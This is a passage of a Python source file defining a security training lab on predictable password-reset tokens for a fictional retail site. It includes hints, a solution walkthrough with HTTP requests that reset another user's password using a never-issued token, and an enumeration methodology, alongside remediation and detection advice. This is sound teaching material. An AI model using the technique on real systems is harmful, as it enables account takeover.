                    "- Bind the token to the account: `WHERE token = ? AND username = ?`.\n"
                    "- Single use — mark or delete on success, and invalidate the whole "
                    "set when a new one is requested.\n"
                    "- Short expiry (15-60 minutes) and invalidate tokens when the "
                    "password changes.\n"
                    "- Never let the reset link carry the username as an authoritative "
                    "parameter; derive it from the token.\n"
                    "- Return an identical response for unknown and known addresses, and "
                    "rate-limit the request endpoint."
                ),
                detect=(
                    "- Alert on reset tokens submitted that were never issued — an "
                    "unknown-token rate that is anything but zero is a strong signal.\n"
                    "- Alert on a reset for an account with no matching request row, "
                    "and on resets arriving at unusual volume.\n"
                    "- Log token issuance *and* consumption together so gaps in the "
                    "sequence are visible.\n"
                    "- Rate-limit and step-up challenge resets for privileged accounts."
                ),
                real=(
                    "Sequential reset tokens have appeared in real software, from "
                    "self-hosted wiki and CMS packages to bespoke internal portals. "
                    "The pattern recurs in tutorials and code samples that use an "
                    "auto-increment primary key as the reset credential, which is why "
                    "'reset link' should never be a phrase that means 'identifier in "
                    "a URL'."
                ),
            ),
            objectives=[
                "Recognise a token space that is arithmetic rather than random",
                "Require the reset handler to look the token up and bind it to an account",
            ],
            hints=[
                "The recovery page shows you a working link. Read it before guessing "
                "anything — the token format is your first clue.",
                "`1001` for the first account, `1002` for the second. Ask what the "
                "third would be, and whether the server actually checks that the value "
                "it receives was ever issued.",
                "Target `carol`, not the account you just requested. You do not need "
                "her real token if the handler never validates it — any integer above "
                "the low thousands is accepted.",
                "`POST /reset` with `token=<any integer >= 1001>`, `user=carol` and a "
                "new password. The success page names the account you just changed."
            ],
            solution=(
                "**Walkthrough**\n\n"
                "1. Trigger the flow and read the delivered link:\n"
                "   ```http\n   POST /forgot\n   "
                "Content-Type: application/x-www-form-urlencoded\n   \n"
                "   email=alice@northwind-retail.test\n   ```\n"
                "   The mail contains "
                "`https://northwind-retail.test/reset?token=1001&user=alice`. Tokens "
                "are 1001, 1002, 1003 — sequential, one per account.\n"
                "2. Attempt the neighbouring token against a different account. The "
                "form is addressed to whoever `user` names:\n"
                "   ```http\n   GET /reset?token=1003&user=carol\n   ```\n"
                "3. Submit a token that was never issued, for the administrator's "
                "account:\n"
                "   ```http\n   POST /reset\n   "
                "Content-Type: application/x-www-form-urlencoded\n   \n"
                "   token=4821&user=carol&password=hijacked\n   ```\n"
                "4. The response is `Password updated for carol.` — the account is "
                "taken over, with no email sent and no code ever issued.\n\n"
                "**Why it works** — `reset_submit()` tests "
                "`token.isdigit() and int(token) >= 1001` and then updates whichever "
                "account `user` names. There is no `SELECT` against the `tokens` "
                "table, so the value the attacker supplies is never checked against "
                "anything. The `>= 1001` floor is the only validation in the handler."
            ),
            methodology=(
                "Trigger the recovery flow for an account you control and read the "
                "link as an artefact: note the token's length, alphabet and position. "
                "If it looks like a counter, a timestamp or a short hash, treat the "
                "space as enumerable. Then test the consuming endpoint directly with a "
                "token you know was never issued — a handler that accepts it has no "
                "lookup at all, and every account is in scope."
            ),
            credentials=(
                "No credentials needed. Request the flow with "
                "`alice@northwind-retail.test` to see a real token; the target is "
                "`carol`."
            ),
            endpoints=(
                "GET / · POST /forgot · GET /reset · POST /reset · "
                "GET /login · POST /login · GET /account · "
                "GET /change · POST /change · POST /api/change · GET /healthz"
            ),
            behaviour=(
                "`POST /reset` accepts any integer token of 1001 or above for any "
                "account without consulting the token table, so tokens are sequential "
                "and need not have been issued."
            ),
            success=(
                "Reset `carol`'s password with a token you never received, then sign in as "
                "`carol` with it and retrieve the flag from `/account`."
            ),
            remediation=(
                "Generate tokens with a CSPRNG, store and look them up, bind each to "
                "its account, make them single-use, and give them a short expiry that "
                "is invalidated on any password change."
            ),
            detection=(
                "Alert on reset tokens that were never issued, on resets with no "
                "matching request, and on unusual reset volume."
            ),
            references=[PS_RECOVERY, PS_RESET_LOGIC],
            lab_family=RESET,
            lab_variant="reset_predictable",
            sort_order=17,
        ),
    ]


MFA_RESET_LABS: list[dict] = [
    *mfa_and_reset_labs(),
]
